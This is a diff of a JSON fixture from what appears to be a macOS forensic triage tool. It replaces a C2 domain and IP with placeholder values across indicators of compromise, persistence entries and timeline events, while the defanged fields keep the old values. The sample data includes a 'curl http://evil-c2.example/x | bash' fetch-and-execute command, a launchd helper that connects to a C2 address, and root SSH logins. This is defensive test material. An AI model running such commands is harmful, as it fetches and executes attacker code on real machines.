@@ -68,7 +68,7 @@
   "iocs": [
     {
       "type": "domain",
-      "value": "evil-c2.top",
+      "value": "evil-c2.example",
       "defanged": "evil-c2[.]top",
       "count": 3,
       "private": false,
@@ -80,7 +80,7 @@
     },
     {
       "type": "ipv4",
-      "value": "91.219.236.14",
+      "value": "203.0.113.14",
       "defanged": "91[.]219[.]236[.]14",
       "count": 2,
       "private": false,
@@ -91,7 +91,7 @@
     },
     {
       "type": "url",
-      "value": "http://evil-c2.top/x",
+      "value": "http://evil-c2.example/x",
       "defanged": "hxxp://evil-c2[.]top/x",
       "count": 1,
       "private": false,
@@ -101,7 +101,7 @@
     },
     {
       "type": "url",
-      "value": "http://evil-c2.top/panel",
+      "value": "http://evil-c2.example/panel",
       "defanged": "hxxp://evil-c2[.]top/panel",
       "count": 1,
       "private": false,
@@ -111,7 +111,7 @@
     },
     {
       "type": "url",
-      "value": "http://evil-c2.top/invoice.dmg",
+      "value": "http://evil-c2.example/invoice.dmg",
       "defanged": "hxxp://evil-c2[.]top/invoice[.]dmg",
       "count": 1,
       "private": false,
@@ -231,7 +231,7 @@
         "timestamp": "2026-07-14T20:14:32Z",
         "kind": "launchd",
         "summary": "com.evil.helper",
-        "detail": "/tmp/helper -c 91.219.236.14",
+        "detail": "/tmp/helper -c 203.0.113.14",
         "severity": "crit",
         "run_at_load": true
       }
@@ -247,7 +247,7 @@
       {
         "timestamp": "2025-07-14T02:01:00Z",
         "kind": "comando",
-        "summary": "curl http://evil-c2.top/x | bash",
+        "summary": "curl http://evil-c2.example/x | bash",
         "detail": "jdoe",
         "severity": "warn"
       }
@@ -256,7 +256,7 @@
       {
         "timestamp": "2024-07-06T23:06:40Z",
         "kind": "visita",
-        "summary": "http://evil-c2.top/panel",
+        "summary": "http://evil-c2.example/panel",
         "detail": "C2 Panel",
         "severity": "info",
         "visit_count": 3,
@@ -267,7 +267,7 @@
       {
         "timestamp": "2024-07-06T23:08:20Z",
         "kind": "cuarentena",
-        "summary": "http://evil-c2.top/invoice.dmg",
+        "summary": "http://evil-c2.example/invoice.dmg",
         "detail": "vía Safari",
         "severity": "warn",
         "source": "jdoe_QuarantineEventsV2"
@@ -286,7 +286,7 @@
       {
         "timestamp": "2026-07-14T02:00:09Z",
         "kind": "system.log",
-        "summary": "Accepted publickey for root from 91.219.236.14",
+        "summary": "Accepted publickey for root from 203.0.113.14",
         "detail": "system.log",
         "severity": "info"
       }
@@ -309,7 +309,7 @@
       "source": "Persistencia",
       "type": "launchd",
       "summary": "com.evil.helper",
-      "detail": "/tmp/helper -c 91.219.236.14",
+      "detail": "/tmp/helper -c 203.0.113.14",
       "severity": "crit"
     },
     {
@@ -324,7 +324,7 @@
       "timestamp": "2026-07-14T02:00:09Z",
       "source": "Logs",
       "type": "system.log",
-      "summary": "Accepted publickey for root from 91.219.236.14",
+      "summary": "Accepted publickey for root from 203.0.113.14",
       "detail": "system.log",
       "severity": "info"
     },
@@ -332,7 +332,7 @@
       "timestamp": "2025-07-14T02:01:00Z",
       "source": "Shell",
       "type": "comando",
-      "summary": "curl http://evil-c2.top/x | bash",
+      "summary": "curl http://evil-c2.example/x | bash",
       "detail": "jdoe",
       "severity": "warn"
     },
@@ -348,7 +348,7 @@
       "timestamp": "2024-07-06T23:08:20Z",
       "source": "Cuarentena",
       "type": "cuarentena",
-      "summary": "http://evil-c2.top/invoice.dmg",
+      "summary": "http://evil-c2.example/invoice.dmg",
       "detail": "vía Safari",
       "severity": "warn"
     },
@@ -356,7 +356,7 @@
       "timestamp": "2024-07-06T23:06:40Z",
       "source": "Navegador",
       "type": "visita",
-      "summary": "http://evil-c2.top/panel",
+      "summary": "http://evil-c2.example/panel",
       "detail": "C2 Panel",
       "severity": "info"
     }
